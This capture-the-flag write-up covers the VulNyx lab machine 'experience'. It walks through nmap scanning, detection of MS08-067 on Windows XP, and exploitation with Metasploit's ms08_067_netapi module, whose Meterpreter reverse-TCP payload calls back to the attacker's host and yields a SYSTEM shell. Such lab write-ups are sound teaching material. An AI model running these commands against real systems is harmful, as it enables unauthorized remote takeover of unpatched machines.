# experience

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| experience | d4t4s3c | Low | VulNyx |

**Summary:** The experience machine was a Windows XP host exposing only Microsoft RPC and SMB related services on ports 135, 139, and 445. Service enumeration identified the operating system as Windows XP with SMB signing disabled and SMB2 negotiation unsupported, which immediately placed the target in the class of legacy Windows systems susceptible to historic SMB remote code execution flaws. A targeted Nmap vulnerability script confirmed that the Server service was likely vulnerable to MS08 067, tracked as CVE 2008 4250, where a crafted RPC request can trigger memory corruption during path canonicalization. The Metasploit `ms08_067_netapi` module was then configured with the target host, local callback address, Meterpreter reverse TCP payload, and the matching target profile. Exploitation succeeded on the first attempt, delivering a Meterpreter session running as `NT AUTHORITY\SYSTEM`. Because the vulnerability executed code directly in a privileged Windows service context, no separate privilege escalation stage was required, and the final SYSTEM session was used to locate and read both `user.txt` and `root.txt` from Bill's desktop.

---

## Reconnaissance

The assessment began by identifying the target on the local VirtualBox network and then enumerating its exposed TCP services.

1. An Nmap ping sweep found the machine at `192.168.56.126`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 00:57 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00032s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0026s latency).
MAC Address: 08:00:27:C1:85:DA (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.126 (192.168.56.126)
Host is up (0.0023s latency).
MAC Address: 08:00:27:1A:34:C0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.96 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.126       
```

2. A full TCP scan showed three open Windows networking ports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=5000 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 00:57 -0400
Nmap scan report for 192.168.56.126 (192.168.56.126)
Host is up (0.0018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:1A:34:C0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

3. Service and script detection identified the host as Windows XP and exposed key SMB details:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 135,139,445 -sC -sV -T4 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 01:10 -0400
Nmap scan report for 192.168.56.126 (192.168.56.126)
Host is up (0.00066s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
MAC Address: 08:00:27:1A:34:C0 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 18h29m58s, deviation: 4h56m59s, median: 14h59m57s
|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:1a:34:c0 (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::- 
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-16T13:10:11-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
```

The host fingerprint clearly indicated Windows XP, and SMB2 negotiation failed, matching an older SMB stack.

---

## Vulnerability Discovery

### MS08 067 Detection

4. Because Windows XP exposed SMB on port 445, the Nmap MS08 067 vulnerability script was executed:

```bash      
┌──(kali㉿kali)-[~/nyx]
└─$ nmap --script smb-vuln-ms08-067 -p445 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 01:14 -0400
Nmap scan report for 192.168.56.126 (192.168.56.126)
Host is up (0.00041s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:1A:34:C0 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

Nmap done: 1 IP address (1 host up) scanned in 3.96 seconds
```

The script marked the target as likely vulnerable to MS08 067, a reliable remote code execution path against unpatched Windows XP systems.

---

## Initial Access

### Exploiting MS08 067 with Metasploit

5. Metasploit was launched and the `ms08_067_netapi` exploit module was configured with the target and callback information:

```bash                                                                     
┌──(kali㉿kali)-[~/nyx]
└─$ msfconsole -q                            
msf > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.56.126
RHOSTS => 192.168.56.126
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.56.104
LHOST => 192.168.56.104
msf exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > set TARGET 7
TARGET => 7
msf exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] 192.168.56.126:445 - Attempting to trigger the vulnerability...
[*] Sending stage (199238 bytes) to 192.168.56.126
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.126:1028) at 2026-08-16 01:27:26 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : EXPERIENCE
OS              : Windows XP (5.1 Build 2600, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

```

The exploit returned a Meterpreter session as `NT AUTHORITY\SYSTEM`, meaning the initial remote code execution immediately landed in the highest local privilege context.

---

## Flag Discovery

### Locating and Reading Evidence Files

6. Meterpreter search was used to locate both flag files on the filesystem:

```bash
meterpreter > search -f user.txt
Found 1 result...
=================

Path                                             Size (bytes)  Modified (UTC)
----                                             ------------  --------------
c:\Documents and Settings\bill\Desktop\user.txt  35            2024-01-21 14:41:28 -0500

meterpreter > search -f root.txt
Found 1 result...
=================

Path                                             Size (bytes)  Modified (UTC)
----                                             ------------  --------------
c:\Documents and Settings\bill\Desktop\root.txt  35            2024-01-21 14:41:54 -0500

```

Both files were located on the desktop of the `bill` profile.

7. A Windows command shell was spawned from Meterpreter, and the flag files were read with `type`:

```bash
meterpreter > shell
Process 1152 created.
Channel 3 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>type "c:\Documents and Settings\bill\Desktop\user.txt"
type "c:\Documents and Settings\bill\Desktop\user.txt"

C:\WINDOWS\system32>type "c:\Documents and Settings\bill\Desktop\root.txt"          
type "c:\Documents and Settings\bill\Desktop\root.txt"
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery identified `192.168.56.126`, and service scanning found Windows RPC and SMB services on ports 135, 139, and 445.

2. **Vulnerability Discovery**: SMB enumeration identified the host as Windows XP, and the `smb-vuln-ms08-067` script confirmed that the target was likely vulnerable to CVE 2008 4250.

3. **Exploitation**: Metasploit's `exploit/windows/smb/ms08_067_netapi` module triggered the vulnerable Server service and returned a Meterpreter session.

4. **Internal Enumeration**: The Meterpreter session was already running as `NT AUTHORITY\SYSTEM`, so post exploitation focused on validating host details and locating the flag files.

5. **Privilege Escalation**: No separate escalation was required because MS08 067 executed in a privileged service context, yielding immediate SYSTEM access and complete control of the host.
